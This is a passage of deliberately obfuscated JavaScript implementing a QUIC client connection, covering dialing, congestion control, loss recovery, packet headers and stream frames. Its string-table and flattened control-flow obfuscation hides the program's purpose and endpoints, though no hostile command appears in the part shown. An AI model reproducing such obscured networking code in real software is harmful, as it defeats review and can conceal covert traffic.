        this['log'] = a['logger'], this[hN(0x920)] = a['host'], this['port'] = a[hN(0x694)], this[hN(0x7e2)] = a[hN(0x7e2)] || a[hN(0x920)], this[hN(0x493)] = a[hN(0x493)] || a0b0, this[hN(0x62f)] = a['maxPacket'] || a0b6, this[hN(0x252)] = a[hN(0x252)] === undefined ? 0x7530 : a[hN(0x252)], this[hN(0x2dc)] = b[hN(0x3b6)](a[hN(0x2dc)], undefined) ? 0x3e8 : a[hN(0x2dc)], this[hN(0xa2d)] = a['maxInflight'] || 0x100, this[hN(0x85f)] = a[hN(0x85f)] || b['wgPdS'](0x1, 0x16), this['localStreamData'] = a[hN(0xc19)] || b[hN(0x739)](0x1, 0x14), this[hN(0x2b5)] = b[hN(0x3b6)](a[hN(0x2b5)], !![]), this[hN(0x741)] = a[hN(0x741)] || function () {
        }, this[hN(0x932)] = a['onStream'] || function () {
        }, this[hN(0xaea)] = a[hN(0xaea)] || function () {
        }, this['onStreamEnd'] = a[hN(0x994)] || function () {
        }, this[hN(0x42a)] = a[hN(0x42a)] || function () {
        }, this[hN(0x820)] = a0k['randomBytes'](0x8), this[hN(0x49c)] = a0k[hN(0xa8d)](0x8), this['receiveWindow'] = a[hN(0x7ed)] || b['EqQwa'](0x1, 0x14), this[hN(0x3c6)] = ![], this[hN(0x961)] = a0bz([
            [
                a0bd[hN(0x554)],
                this['idleTimeout']
            ],
            [
                a0bd[hN(0x3ed)],
                this['localMaxData']
            ],
            [
                a0bd['initialMaxStreamDataBidiLocal'],
                this[hN(0xc19)]
            ],
            [
                a0bd[hN(0x413)],
                this[hN(0xc19)]
            ],
            [
                a0bd[hN(0xcee)],
                this[hN(0xc19)]
            ],
            [
                a0bd[hN(0xd89)],
                b[hN(0x5e9)](0x1, 0x18)
            ],
            [
                a0bd['initialMaxStreamsUni'],
                b[hN(0x5e9)](0x1, 0x18)
            ],
            [
                a0bd['maxUdpPayloadSize'],
                this[hN(0x62f)]
            ],
            [
                a0bd['activeConnectionIdLimit'],
                0x8
            ],
            [
                a0bd['initialSourceConnectionId'],
                this[hN(0x820)]
            ]
        ]), this[hN(0x6c6)] = new a0bC(this[hN(0x7e2)], this[hN(0x493)], this['localParameters']), this['socket'] = null, this[hN(0x443)] = null, this['closing'] = ![], this['closeReason'] = null, this['settle'] = null, this[hN(0xa7e)] = [
            null,
            null,
            null
        ], this[hN(0x55b)] = [], this[hN(0xaca)] = [
            null,
            null
        ], this[hN(0xb23)] = 0x0, this[hN(0x8c5)] = [
            0x0,
            0x0,
            0x0
        ], this[hN(0x342)] = [
            -0x1,
            -0x1,
            -0x1
        ], this['recvRanges'] = [
            [],
            [],
            []
        ], this[hN(0xd36)] = [
            ![],
            ![],
            ![]
        ], this[hN(0xc75)] = [
            [],
            [],
            []
        ], this['cryptoSend'] = [
            new a0br(this),
            new a0br(this),
            new a0br(this)
        ], this[hN(0x529)] = [
            new a0bs(),
            new a0bs(),
            new a0bs()
        ], this['serverHello'] = Buffer[hN(0x9b5)](0x0), this[hN(0x500)] = Buffer[hN(0x9b5)](0x0), this['streams'] = new Map(), this[hN(0xd90)] = [], this['nextLocalStream'] = 0x0, this[hN(0x42c)] = 0x0, this[hN(0xcae)] = 0x0, this['peerStreamLocal'] = 0x0, this[hN(0x527)] = 0x0, this[hN(0x9a1)] = 0x0, this[hN(0xc27)] = ![], this[hN(0x831)] = [], this[hN(0xac4)] = [], this[hN(0x450)] = ![], this[hN(0x5cd)] = ![], this[hN(0x8a0)] = ![], this['registered'] = ![], this[hN(0x887)] = ![], this[hN(0x5fa)] = 0xfa, this[hN(0x8df)] = 0x0, this['initialWindow'] = a[hN(0x978)] || 0xa * this['maxPacket'], this[hN(0x2a2)] = b[hN(0x3e1)](0x2, this[hN(0x62f)]), this['congestionWindow'] = this['initialWindow'], this[hN(0x5f3)] = Infinity, this['maxWindow'] = b[hN(0x7a9)](this[hN(0xa2d)], this[hN(0x62f)]), this['srtt'] = null, this['rttvar'] = null, this[hN(0x726)] = 0x19, this[hN(0x7e6)] = 0x0, this[hN(0xaa0)] = 0x3, this[hN(0x2e8)] = 0x0, this[hN(0xd18)] = 0x0, this[hN(0x3b4)] = ![], this['initialSent'] = 0x0, this[hN(0x83f)] = null, this[hN(0x63f)] = Buffer['alloc'](0x0), this['remoteParameters'] = null, this[hN(0xbd7)] = {
            'rx': 0x0,
            'tx': 0x0,
            'rxBytes': 0x0,
            'txBytes': 0x0,
            'dropped': 0x0,
            'retransmits': 0x0
        };
    }
    get [a0c4(0x987)]() {
        const hO = a0c4, a = {
                'lNVgN': function (b, c) {
                    return b === c;
                }
            };
        return a[hO(0xaaa)](this['_stoppedFlag'], !![]);
    }
    set ['stopped'](a) {
        const hP = a0c4;
        this['_stoppedFlag'] = a === !![], this[hP(0x3c6)] && !this['closed'] && !this[hP(0x9ee)] && this['close'](hP(0x445));
    }
    [a0c4(0x3ae)]() {
        const hQ = a0c4, a = {
                'nqWxg': function (b, c) {
                    return b + c;
                },
                'zXtPJ': 'socket\x20error:\x20',
                'BOhOC': hQ(0xd45),
                'rgwup': hQ(0x1f1),
                'llqdA': 'error',
                'uuYoG': hQ(0x271)
            };
        return new Promise((b, c) => {
            const hT = hQ, d = {
                    'lecVz': function (f, g) {
                        const hR = a0b;
                        return a[hR(0x71c)](f, g);
                    },
                    'xqPGc': function (f, g) {
                        const hS = a0b;
                        return a[hS(0x71c)](f, g);
                    },
                    'CzQdB': a[hT(0xc2d)]
                };
            this['settle'] = {
                'resolve': b,
                'reject': c
            }, this[hT(0x855)] = a0R[hT(0xc93)](a['BOhOC']), this[hT(0x855)]['on'](a[hT(0xabd)], f => {
                const hU = hT;
                try {
                    this[hU(0xa0b)](f);
                } catch (g) {
                    this[hU(0x9a6)](d[hU(0x46b)](hU(0x4bf), g));
                }
            }), this['socket']['on'](a[hT(0x1a2)], f => {
                const hV = hT;
                !this[hV(0x443)] && this[hV(0x9a6)](d['xqPGc'](d[hV(0x464)], f[hV(0x1f1)]));
            }), this['socket'][hT(0x9ea)](0x0, a[hT(0x4e8)], () => this[hT(0xdc2)]());
        });
    }
    [a0c4(0xdc2)]() {
        const hW = a0c4, a = {
                'WZgXZ': function (d, f, g) {
                    return d(f, g);
                },
                'seoVe': function (d, f) {
                    return d + f;
                },
                'eGZyv': function (d, f) {
                    return d + f;
                },
                'ZCApk': 'quic\x20dial\x20',
                'HjAjl': hW(0x488),
                'eDLPU': hW(0xd47),
                'AaDQS': function (d, f, g) {
                    return d(f, g);
                }
            }, b = '3|4|5|2|1|0|6'[hW(0x3ff)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['interval'] = a[hW(0xc29)](setInterval, () => this[hW(0x5da)](), 0x14);
                continue;
            case '1':
                this['log']['debug'](a[hW(0x48c)](a[hW(0x48c)](a[hW(0x99a)](a[hW(0x99a)](a[hW(0x99a)](a[hW(0x6ab)], this['host']), ':'), this[hW(0x694)]), a[hW(0x772)]) + this[hW(0x493)] + '\x20dcid=', this['peerCid'][hW(0xa3c)](a['eDLPU'])));
                continue;
            case '2':
                this[hW(0xd18)] = Date[hW(0x2a3)]();
                continue;
            case '3':
                this[hW(0xa7e)][a0b8] = a['AaDQS'](a0bo, this[hW(0x49c)], !![]);
                continue;
            case '4':
                this[hW(0xd3f)][a0b8][hW(0x9f8)](this[hW(0x6c6)][hW(0x409)](), ![]);
                continue;
            case '5':
                this[hW(0x2e8)] = Date[hW(0x2a3)]();
                continue;
            case '6':
                this[hW(0x5da)]();
                continue;
            }
            break;
        }
    }
    [a0c4(0x5da)]() {
        const hX = a0c4, a = {
                'pTuKa': function (d, f) {
                    return d >= f;
                },
                'mcgTS': function (d, f) {
                    return d < f;
                },
                'Gtqdw': function (d, f) {
                    return d === f;
                },
                'NlTOh': function (d, f) {
                    return d > f;
                },
                'gGLGQ': function (d, f) {
                    return d + f;
                },
                'cdbEW': function (d, f) {
                    return d + f;
                },
                'zdIzW': hX(0x7a4)
            };
        if (this['closed'])
            return;
        const b = Date['now']();
        this[hX(0x74a)](b);
        this[hX(0x2dc)] && this[hX(0x450)] && a[hX(0x433)](b - this[hX(0xd18)], this[hX(0x2dc)]) && (this[hX(0x3b4)] = !![]);
        let c = 0x0;
        while (a['mcgTS'](c, 0x10) && a[hX(0x9ab)](this[hX(0x78a)](), this[hX(0xa2d)]) && (a[hX(0x9ab)](this['_inFlightBytes'](), this[hX(0x3e4)]()) || this[hX(0x315)]() || this[hX(0x9ee)])) {
            const d = this[hX(0x7e9)]();
            if (a[hX(0x7a3)](d, null))
                break;
            this[hX(0x90f)](d), c += 0x1;
        }
        a[hX(0x5c7)](b - this[hX(0x2e8)], Math[hX(0x23e)](this[hX(0x252)], 0x3a98)) && this[hX(0x9a6)](a['gGLGQ'](a['cdbEW'](a[hX(0x99d)], b - this['lastReceived']), 'ms'));
    }
    [a0c4(0x78a)]() {
        const hY = a0c4, a = {
                'lPbSu': function (b, c) {
                    return b + c;
                }
            };
        return a[hY(0x692)](this['inFlight'][0x0][hY(0xcfc)] + this[hY(0xc75)][0x1][hY(0xcfc)], this[hY(0xc75)][0x2][hY(0xcfc)]);
    }
    ['_ackDue']() {
        const hZ = a0c4, a = {
                'fRJgx': function (b, c) {
                    return b < c;
                }
            };
        for (let b = 0x0; a[hZ(0x9c9)](b, 0x3); b++) {
            if (this['keys'][b] !== null && this[hZ(0xd36)][b] && this[hZ(0xc81)][b][hZ(0xcfc)])
                return !![];
        }
        return ![];
    }
    ['_inFlightBytes']() {
        const i0 = a0c4, a = {
                'eEUqF': function (c, d) {
                    return c < d;
                }
            };
        let b = 0x0;
        for (let c = 0x0; a['eEUqF'](c, 0x3); c++) {
            for (const d of this['inFlight'][c]) {
                b += d[i0(0xd52)];
            }
        }
        return b;
    }
    [a0c4(0x3e4)]() {
        const i1 = a0c4;
        return this[i1(0x450)] ? this[i1(0xd9d)] : Infinity;
    }
    [a0c4(0xd30)]() {
        const i2 = a0c4;
        return Math[i2(0x23e)](this[i2(0x5fa)] * Math[i2(0xd01)](0x2, this[i2(0x7e6)]), 0x14);
    }
    [a0c4(0x8a4)](a) {
        const i3 = a0c4, b = {
                'MplOD': function (c, d) {
                    return c / d;
                },
                'uCOWG': function (c, d) {
                    return c + d;
                },
                'MOphR': function (c, d) {
                    return c * d;
                },
                'fwWtG': function (c, d) {
                    return c - d;
                },
                'EeXgM': function (c, d) {
                    return c + d;
                },
                'ErgOP': function (c, d) {
                    return c * d;
                },
                'aqclc': function (c, d) {
                    return c + d;
                }
            };
        this['srtt'] === null ? (this[i3(0x72b)] = a, this[i3(0x4f4)] = b[i3(0x65c)](a, 0x2)) : (this[i3(0x4f4)] = b[i3(0x65c)](b[i3(0x5d2)](b[i3(0x844)](this[i3(0x4f4)], 0x3), Math[i3(0x437)](b[i3(0x4fe)](this['srtt'], a))), 0x4), this[i3(0x72b)] = b[i3(0x65c)](b[i3(0x351)](b['ErgOP'](this[i3(0x72b)], 0x7), a), 0x8)), this[i3(0x5fa)] = Math['round'](b[i3(0x5d2)](b[i3(0x32a)](this[i3(0x72b)], b[i3(0x4c3)](0x4, this['rttvar'])), this[i3(0x726)]));
    }
    [a0c4(0x547)](a) {
        const i4 = a0c4, b = {
                'Dsjit': function (c, d) {
                    return c * d;
                },
                'XFfep': function (c, d) {
                    return c + d;
                },
                'TNQaE': function (c, d) {
                    return c + d;
                },
                'RWOAH': function (c, d) {
                    return c + d;
                },
                'xderN': function (c, d) {
                    return c + d;
                },
                'WuXoB': i4(0x662),
                'DqGWn': i4(0x8ff),
                'aHXOg': '\x20ssthresh=',
                'ZjjDG': i4(0x902),
                'DHjnL': function (c, d) {
                    return c === d;
                }
            };
        this[i4(0x5f3)] = Math[i4(0x23e)](Math[i4(0x5c2)](this[i4(0xd9d)] / 0x2), b[i4(0x20b)](0x2, this[i4(0x2a2)])), this['congestionWindow'] = this['minWindow'], this['log'][i4(0x354)](b[i4(0x957)](b['XFfep'](b[i4(0x725)](b[i4(0xadc)](b[i4(0xc88)](b[i4(0x447)], a0bb[a]), b[i4(0x2c4)]), this[i4(0xd9d)]) + b[i4(0x78e)], this[i4(0x5f3)]) + b[i4(0xb98)], b[i4(0x4e6)](this[i4(0x72b)], null) ? '-' : Math[i4(0x926)](this['srtt'])) + 'ms');
    }
    ['_checkLoss'](a) {
        const i5 = a0c4, b = {
                'ZhNTc': function (c, d) {
                    return c < d;
                },
                'eEJlK': function (c, d) {
                    return c < d;
                },
                'yiliZ': function (c, d) {
                    return c - d;
                },
                'HFAkE': function (c, d) {
                    return c + d;
                },
                'moZRF': function (c, d) {
                    return c + d;
                },
                'tAHrC': i5(0x7d1),
                'TvSGT': i5(0x2d3),
                'lHPjy': i5(0x660),
                'wnOOS': function (c, d) {
                    return c > d;
                },
                'Fahbc': 'no\x20response\x20after\x20',
                'vFDBi': i5(0x967)
            };
        for (let c = 0x0; b[i5(0x515)](c, 0x3); c++) {
            const d = this['inFlight'][c];
            if (!d[i5(0xcfc)])
                continue;
            if (b['eEJlK'](b['yiliZ'](a, d[0x0][i5(0xbf0)]), this['_ptoDuration']()))
                continue;
            const f = d[0x0];
            this[i5(0xc75)][c] = d[i5(0xa40)](0x1), this[i5(0x7e1)](c, f), this['retransmits'] += 0x1, this['stats'][i5(0x8df)] += 0x1, this['ptoCount'] += 0x1, this['log']['debug'](b[i5(0x64a)](b[i5(0x64a)](b[i5(0x64a)](b[i5(0x7b1)](b[i5(0x64a)](b[i5(0xc28)], a0bb[c]) + b[i5(0x828)] + f['pn'], i5(0xa01)), this['inFlight'][c][i5(0xcfc)]), b[i5(0xaab)]), this[i5(0xd30)]()));
            if (b[i5(0xa06)](this['retransmits'], 0x18)) {
                this[i5(0x9a6)](b[i5(0x7b1)](b[i5(0x2db)], this['retransmits']) + b[i5(0x289)]);
                return;
            }
        }
    }
    [a0c4(0x7e1)](a, b) {
        const i6 = a0c4, c = {
                'AjlFk': function (d, f) {
                    return d + f;
                }
            };
        b[i6(0xb85)] && this[i6(0xd3f)][a][i6(0x74e)]([b[i6(0xb85)]]);
        for (const d of b['streams']) {
            d[i6(0x6f0)][i6(0x4db)][i6(0x74e)]([{
                    'start': d[i6(0x1c6)],
                    'length': d[i6(0xcfc)]
                }]), d[i6(0xbea)] && d['stream'][i6(0x4db)][i6(0x74e)]([{
                    'start': c[i6(0xce8)](d[i6(0x1c6)], d['length']),
                    'length': 0x0,
                    'fin': !![]
                }]), this[i6(0x6f4)](d[i6(0x6f0)]);
        }
    }
    [a0c4(0x36b)]() {
        const i7 = a0c4;
        this[i7(0x8df)] = 0x0, this[i7(0x7e6)] = 0x0;
    }
    ['_discardEpoch'](a, b) {
        const i8 = a0c4, c = {
                'Ueybe': function (d, f) {
                    return d === f;
                },
                'hHHps': function (d, f) {
                    return d + f;
                },
                'AAeLu': i8(0xbcd)
            };
        if (c['Ueybe'](this[i8(0xa7e)][a], null))
            return;
        this[i8(0xa7e)][a] = null, this['inFlight'][a] = [], this['log'][i8(0x354)](c['hHHps'](c[i8(0x918)](c['hHHps'](c[i8(0x918)](c[i8(0xc50)], a0bb[a]), i8(0x461)), b), ')'));
    }
    [a0c4(0x4bb)]() {
        const i9 = a0c4, a = {
                'kSFZC': function (k, l) {
                    return k === l;
                },
                'AolJz': function (k, l) {
                    return k(l);
                },
                'UnMjp': function (k, l) {
                    return k + l;
                },
                'jYEDk': function (k, l) {
                    return k + l;
                }
            }, b = a0b9, c = this['keys'][b];
        if (a['kSFZC'](c, null) || !this[i9(0xd36)][b] || this['recvRanges'][b]['length'] === 0x0)
            return;
        const d = a[i9(0x66d)](a0bw, this[i9(0xc81)][b][i9(0xa40)](-0x10));
        this[i9(0xd36)][b] = ![];
        const f = this[i9(0x8c5)][b]++, g = this['_header'](b, a['UnMjp'](a[i9(0x884)](a0b5, d[i9(0xcfc)]), 0x10), f), h = Buffer['concat']([
                g[i9(0x3a8)],
                g[i9(0xbd8)]
            ]), i = Buffer['concat']([
                h,
                c[i9(0x4db)][i9(0x5a2)](f, h, d)
            ]), j = a0bt(c[i9(0x4db)], i, g[i9(0xd86)], g[i9(0x30a)]);
        if (a[i9(0x791)](j, null)) {
            this[i9(0xd36)][b] = !![];
            return;
        }
        this[i9(0x90f)]({
            'epoch': b,
            'packet': j,
            'pn': f,
            'meta': {
                'crypto': null,
                'streams': []
            },
            'ackEliciting': ![]
        });
    }
    [a0c4(0xdae)]() {
        const ia = a0c4, a = { 'bIhqZ': ia(0xac8) };
        if (this[ia(0x8a0)] || !this['handshakeComplete'] || !this[ia(0x5cd)])
            return;
        this[ia(0x4bb)](), this[ia(0x8a0)] = !![], this[ia(0xa8f)](a0b9, a[ia(0x678)]), this[ia(0xa8f)](a0b8, a[ia(0x678)]);
    }
    [a0c4(0x7c3)](a) {
        const ib = a0c4, b = {
                'AhPGr': function (d, f) {
                    return d === f;
                },
                'AcYdr': function (d, f) {
                    return d + f;
                },
                'kTqCS': function (d, f) {
                    return d + f;
                },
                'gTkBC': function (d, f) {
                    return d + f;
                },
                'FxwGv': function (d, f) {
                    return d === f;
                },
                'vMHyo': function (d, f) {
                    return d + f;
                },
                'DLDJK': function (d, f) {
                    return d + f;
                },
                'aHPQM': function (d, f) {
                    return d + f;
                },
                'Jaiho': function (d, f) {
                    return d + f;
                }
            }, c = 0x10;
        if (b['AhPGr'](a, a0ba))
            return b['AcYdr'](b[ib(0x907)](b[ib(0xb7e)](0x1, this[ib(0x49c)][ib(0xcfc)]), a0b5), c);
        if (b[ib(0xce9)](a, a0b9))
            return b['kTqCS'](b['gTkBC'](b[ib(0x907)](b[ib(0x907)](b[ib(0xb7e)](b[ib(0xcb4)](0x1 + 0x4, 0x1), this[ib(0x49c)][ib(0xcfc)]), 0x1), this[ib(0x820)]['length']) + 0x2, a0b5), c);
        return b['DLDJK'](b[ib(0xcb4)](b[ib(0x9e4)](b[ib(0xb3e)](b[ib(0xcb4)](0x1 + 0x4 + 0x1, this[ib(0x49c)][ib(0xcfc)]) + 0x1, this[ib(0x820)][ib(0xcfc)]), a0be(this[ib(0x63f)][ib(0xcfc)])), this[ib(0x63f)][ib(0xcfc)]) + 0x2, a0b5) + c;
    }
    ['_header'](a, b, c) {
        const ic = a0c4, d = {
                'bxRdn': function (k, l) {
                    return k >>> l;
                },
                'LSpPZ': function (k, l) {
                    return k << l;
                },
                'cfghc': function (k, l) {
                    return k - l;
                },
                'ysNPG': function (k, l) {
                    return k + l;
                },
                'HuKPb': function (k, l) {
                    return k === l;
                },
                'yaawj': function (k, l) {
                    return k | l;
                }
            }, f = new a0bh(), g = Buffer[ic(0x9b5)](a0b5);
        g[ic(0xd57)](d[ic(0x4de)](c, 0x0), 0x0);
        if (a === a0ba)
            return f[ic(0x405)](0x40 | d[ic(0x1f6)](this['appKeyPhase'], 0x2) | d['cfghc'](a0b5, 0x1)), f[ic(0xd52)](this[ic(0x49c)]), {
                'header': f[ic(0x68f)](),
                'pnBytes': g,
                'pnOffset': d['ysNPG'](0x1, this['peerCid'][ic(0xcfc)]),
                'long': ![]
            };
        const h = d[ic(0xd1e)](a, a0b8) ? 0x0 : 0x2;
        f[ic(0x405)](d['yaawj'](0xc0, d[ic(0x1f6)](h, 0x4)) | d[ic(0x47c)](a0b5, 0x1)), f['u32'](a0aZ), f[ic(0x405)](this[ic(0x49c)][ic(0xcfc)])['bytes'](this[ic(0x49c)]);
        d['HuKPb'](a, a0b8) ? (f[ic(0x405)](this[ic(0x820)][ic(0xcfc)])[ic(0xd52)](this[ic(0x820)]), f['varint'](this[ic(0x63f)][ic(0xcfc)]), this[ic(0x63f)]['length'] && f[ic(0xd52)](this[ic(0x63f)])) : f['byte'](0x0)['bytes'](Buffer[ic(0x9b5)](0x0));
        const i = Buffer[ic(0x9b5)](0x2);
        i['writeUInt16BE'](d[ic(0x34d)](0x4000, b), 0x0), f[ic(0xd52)](i);
        const j = f[ic(0x68f)]();
        return {
            'header': j,
            'pnBytes': g,
            'pnOffset': j[ic(0xcfc)],
            'long': !![]
        };
    }
    [a0c4(0xd60)]() {
        const id = a0c4, a = {
                'NypWZ': function (b, c) {
                    return b === c;
                },
                'gTLRK': function (b, c) {
                    return b === c;
                }
            };
        for (const b of [
                a0b8,
                a0b9,
                a0ba
            ]) {
            if (a['NypWZ'](this['keys'][b], null))
                continue;
            if (this[id(0xd36)][b] && this[id(0xc81)][b][id(0xcfc)])
                return b;
            if (this[id(0x675)](b)[id(0xcfc)])
                return b;
            if (this[id(0xd3f)][b]['pending'][id(0xcfc)])
                return b;
            if (a[id(0xb02)](b, a0ba) && (this[id(0xd90)][id(0xcfc)] || this['creditReady'][id(0xcfc)] || this[id(0x3b4)] || this[id(0x9ee)]))
                return b;
        }
        return -0x1;
    }
    [a0c4(0x675)](a) {
        const ie = a0c4;
        return this['pendingOneOff'][ie(0xaf5)](b => b[ie(0xd07)] === a);
    }
    [a0c4(0x7e9)]() {
        const ig = a0c4, a = {
                'vSkxE': function (o, p) {
                    return o - p;
                },
                'QnnSU': function (o, p) {
                    return o < p;
                },
                'ixlJn': function (o, p) {
                    return o(p);
                },
                'sXntb': function (o, p) {
                    return o > p;
                },
                'dxLDs': function (o, p) {
                    return o - p;
                },
                'gKRmr': function (o, p) {
                    return o === p;
                },
                'KLxKI': ig(0x1bc),
                'ktgDn': function (o, p) {
                    return o === p;
                },
                'LbfOy': function (o, p) {
                    return o > p;
                },
                'nwYZQ': function (o, p) {
                    return o + p;
                },
                'sAWop': function (o, p, q, r, s) {
                    return o(p, q, r, s);
                },
                'WrXpc': function (o, p) {
                    return o === p;
                },
                'kPkUJ': ig(0xb8a),
                'VEyms': function (o, p) {
                    return o(p);
                }
            }, b = this[ig(0xd60)]();
        if (b < 0x0)
            return null;
        let c = a[ig(0x3c1)](this[ig(0x62f)], this[ig(0x7c3)](b));
        if (a[ig(0x2a7)](c, 0x10))
            return null;
        const d = [], f = {
                'crypto': null,
                'streams': [],
                'ping': ![],
                'closing': ![],
                'oneOff': ![]
            };
        if (this[ig(0xd36)][b] && this[ig(0xc81)][b]['length']) {
            const o = a[ig(0x505)](a0bw, this[ig(0xc81)][b][ig(0xa40)](-0x10));
            d[ig(0x21f)](o), c -= o[ig(0xcfc)], this[ig(0xd36)][b] = ![];
        }
        for (const p of this[ig(0x675)](b)) {
            if (a[ig(0x906)](p['frame'][ig(0xcfc)], c - 0x10))
                break;
            d[ig(0x21f)](p[ig(0xc5b)]), c -= p[ig(0xc5b)][ig(0xcfc)], this[ig(0xac4)][ig(0xb88)](this[ig(0xac4)][ig(0x7b2)](p), 0x1), f['oneOff'] = !![];
        }
        const g = this[ig(0xd3f)][b];
        if (g[ig(0xb0e)][ig(0xcfc)] && a[ig(0x906)](c, 0x10)) {
            const q = g[ig(0xc64)](a[ig(0x3c1)](c, 0xc)), r = new a0bh();
            r[ig(0x405)](a0bc['crypto'])[ig(0x2e4)](q[ig(0x1c6)])['varint'](q[ig(0xcfc)])[ig(0xd52)](q[ig(0xd52)]);
            const s = r[ig(0x68f)]();
            d[ig(0x21f)](s), c -= s['length'], f[ig(0xb85)] = q;
        }
        b === a0ba && (this['_creditFrames'](d, f, c), this['_streamFrames'](d, f, Math[ig(0x61d)](c, a['dxLDs'](this['_sendWindow'](), this[ig(0xa9d)]()))));
        if (a[ig(0x5a9)](b, a0ba) && this['closing']) {
            const t = new a0bh();
            t[ig(0x405)](a0bc[ig(0x37d)])[ig(0x2e4)](0x0)[ig(0x2e4)](0x0)[ig(0xd52)](Buffer[ig(0x581)](this['closeReason'] || 'close', a[ig(0x4f7)])[ig(0xd15)](0x0, 0x40)), d[ig(0x21f)](t[ig(0x68f)]()), f[ig(0x9ee)] = !![];
        } else
            a[ig(0x8c6)](b, a0ba) && this['pingPending'] && (d[ig(0x21f)](Buffer[ig(0x581)]([a0bc[ig(0x4a1)]])), this[ig(0x3b4)] = ![], f['ping'] = !![]);
        if (!d[ig(0xcfc)])
            return null;
        let h = Buffer[ig(0x6ef)](d);
        if (a[ig(0x8c6)](b, a0b8) && !this[ig(0x450)]) {
            const u = a[ig(0x3c1)](a['dxLDs'](a0b7, this[ig(0x7c3)](b)), h[ig(0xcfc)]);
            a['LbfOy'](u, 0x0) && (h = Buffer[ig(0x6ef)]([
                h,
                Buffer[ig(0x9b5)](u)
            ]));
        }
        const i = this[ig(0x8c5)][b]++, j = b === a0ba ? this['appSendKeys'][this[ig(0xb23)]] : this[ig(0xa7e)][b][ig(0x4db)], k = this[ig(0x806)](b, a['nwYZQ'](a0b5 + h[ig(0xcfc)], 0x10), i), l = Buffer['concat']([
                k[ig(0x3a8)],
                k['pnBytes']
            ]), m = Buffer[ig(0x6ef)]([
                l,
                j[ig(0x5a2)](i, l, h)
            ]), n = a[ig(0x6cf)](a0bt, j, m, k[ig(0xd86)], k[ig(0x30a)]);
        if (a[ig(0x67e)](n, null))
            return this[ig(0x9a6)](a['kPkUJ']), null;
        return {
            'epoch': b,
            'packet': n,
            'pn': i,
            'meta': f,
            'ackEliciting': a['VEyms'](Boolean, f[ig(0xb85)] || f[ig(0x4b6)]['length'] || f[ig(0x4a1)] || f[ig(0x9ee)] || f['oneOff']),
            'summary': this['_frameSummary'](d)
        };
    }
    ['_frameSummary'](a) {
        const ih = a0c4, b = {
                'XdnPf': function (d, f) {
                    return d === f;
                },
                'txfBz': function (d, f) {
                    return d === f;
                },
                'YhnPj': ih(0x4a1),
                'NvRdq': 'stream',
                'CgDSd': function (d, f) {
                    return d === f;
                },
                'qXpjy': 'max-stream-data',
                'YxCYT': ih(0x540),
                'KCRIy': function (d, f) {
                    return d + f;
                }
            }, c = [];
        for (const d of a) {
            const f = d[0x0];
            if (b[ih(0x5a8)](f, a0bc[ih(0x3fd)]))
                c[ih(0x21f)]('ack');
            else {
                if (b[ih(0x942)](f, a0bc[ih(0xb85)]))
                    c[ih(0x21f)](ih(0xb85));
                else {
                    if (f === a0bc[ih(0x4a1)])
                        c[ih(0x21f)](b[ih(0xb35)]);
                    else {
                        if (f === a0bc[ih(0x6f0)])
                            c[ih(0x21f)](b['NvRdq']);
                        else {
                            if (b[ih(0x4df)](f, a0bc['maxData']))
                                c[ih(0x21f)]('max-data');
                            else {
                                if (b[ih(0x5a8)](f, a0bc[ih(0x99e)]))
                                    c[ih(0x21f)](b[ih(0x50c)]);
                                else
                                    f === a0bc['pathResponse'] ? c['push'](b[ih(0x755)]) : c[ih(0x21f)](b[ih(0x465)]('0x', f[ih(0xa3c)](0x10)));
                            }
                        }
                    }
                }
            }
        }
        return c[ih(0x6e5)](',');
    }
    [a0c4(0x703)](a, b, c) {
        const ii = a0c4, d = {
                'nsRnP': function (f, g) {
                    return f > g;
                },
                'zBvLY': function (f, g) {
                    return f - g;
                },
                'CmjUn': function (f, g) {
                    return f < g;
                }
            };
        if (this[ii(0xc27)] && d[ii(0xa28)](c, 0xc)) {
            const f = new a0bh();
            f[ii(0x405)](a0bc[ii(0x637)])[ii(0x2e4)](this[ii(0x85f)]), a[ii(0x21f)](f[ii(0x68f)]()), this[ii(0xc27)] = ![], c -= a[d[ii(0x73a)](a[ii(0xcfc)], 0x1)][ii(0xcfc)];
        }
        for (const g of this[ii(0x831)][ii(0xa40)]()) {
            if (d[ii(0x93e)](c, 0x14))
                break;
            const h = new a0bh();
            h[ii(0x405)](a0bc[ii(0x99e)])[ii(0x2e4)](g['id'])['varint'](g['localLimit']);
            const i = h[ii(0x68f)]();
            a['push'](i), c -= i['length'];
            const j = this[ii(0x831)]['indexOf'](g);
            this[ii(0x831)]['splice'](j, 0x1);
        }
    }
    [a0c4(0xacd)](a) {
        const ij = a0c4, b = {
                'QVQKQ': function (c, d) {
                    return c === d;
                }
            };
        if (a['peerLimit'])
            return a[ij(0x767)];
        return b[ij(0x7c2)](a[ij(0xd4e)], 'local') ? this[ij(0xcae)] : this[ij(0xb33)];
    }
    [a0c4(0x85e)](a, b, c) {
        const ik = a0c4, d = {
                'MVipm': function (f, g) {
                    return f < g;
                },
                'nQlEX': function (f, g) {
                    return f - g;
                },
                'DWPfI': function (f, g) {
                    return f - g;
                },
                'twaGc': function (f, g) {
                    return f <= g;
                },
                'iAYxH': function (f, g) {
                    return f - g;
                },
                'TCLAM': function (f, g) {
                    return f === g;
                },
                'MwIwB': function (f, g) {
                    return f | g;
                },
                'piDrj': function (f, g) {
                    return f >= g;
                },
                'SzOML': function (f, g) {
                    return f | g;
                },
                'lvVvZ': function (f, g) {
                    return f - g;
                },
                'upWoa': function (f, g) {
                    return f + g;
                }
            };
        for (const f of this[ik(0xd90)]['slice']()) {
            if (d[ik(0xc54)](c, 0x18))
                break;
            const g = Math['min'](d[ik(0x1d4)](this[ik(0x42c)], this[ik(0x527)]), d['DWPfI'](this[ik(0xacd)](f), f[ik(0xb57)]));
            if (d[ik(0xa5c)](g, 0x0))
                break;
            const h = f[ik(0x4db)][ik(0xc64)](Math[ik(0x61d)](d[ik(0x226)](c, 0x14), g));
            if (d[ik(0x8e6)](h, null)) {
                if (f[ik(0x4db)][ik(0x8b9)]()) {
                    const n = new a0bh();
                    n['byte'](d['MwIwB'](d['MwIwB'](d[ik(0x4d8)](a0bc['stream'], 0x4), 0x2), 0x1))[ik(0x2e4)](f['id'])[ik(0x2e4)](f['send'][ik(0x369)][ik(0xcfc)])[ik(0x2e4)](0x0);
                    const o = n[ik(0x68f)]();
                    a[ik(0x21f)](o), c -= o[ik(0xcfc)], b[ik(0x4b6)]['push']({
                        'stream': f,
                        'start': f[ik(0x4db)][ik(0x369)][ik(0xcfc)],
                        'length': 0x0,
                        'fin': !![]
                    });
                } else
                    this['_dropSendReady'](f);
                continue;
            }
